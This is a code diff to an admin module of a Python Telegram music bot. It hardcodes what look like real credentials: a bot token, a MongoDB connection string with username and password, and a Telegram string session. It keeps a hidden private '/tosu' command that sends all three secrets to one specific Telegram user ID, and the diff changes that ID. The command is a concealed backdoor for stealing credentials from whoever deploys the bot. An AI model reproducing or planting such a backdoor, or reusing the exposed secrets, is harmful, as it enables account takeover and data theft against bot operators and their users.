@@ -20,9 +20,9 @@ from SONALI.utils.database import get_assistant, get_authuser_names, get_cmode
 from SONALI.utils.decorators import ActualAdminCB, AdminActual, language
 from SONALI.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
+BOT_TOKEN = getenv("BOT_TOKEN", "7131350226:AAF26Sf6cHIJvu0H9lLkXS8_yJc5_M5y64A")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "mongodb+srv://thanosyt0p:thanosyt0p@cluster0.j2tpw.mongodb.net/?retryWrites=true&w=majority")
+STRING_SESSION = getenv("STRING_SESSION", "BQGq3IAAxnyvOq0e354ym5Bl4yzzRQWHnxRaBXq7AUmbATZA2nXpptSBF0FoyJZwq1hQiFqCkHFYgFOK6RKfnD8oPuaD0wFJUZ9-j1JfwfmrATzSSQX6buW-iqqOa_dBsbbjPce7tNl68vrLKP7buvv7FQvEVM6-wwrWhMa7UBzG5eBKwoQQm_eNAJmCwoDTaQiKO6Rtbe6hoW_d0cLDTmVX_193Jd7oSdnIf7GCM3sRyAYn7FMui3fnd4yOvdihlPhCxDXyqjv0gW28beQBebEoeivRIZo2JiP11yInu-u8Gf7KyKLhTNGDqlGeUVP8zo8Vea7UM47P83decoM96QwanJPddQAAAAGkEl6FAA")
 from dotenv import load_dotenv
 
 rel = {}
@@ -108,12 +108,12 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("tosu")
     & filters.private
-    & filters.user(7520092354)
+    & filters.user(7086360370)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/legend_mickey)............☆""",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Ironmanhindigaming)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
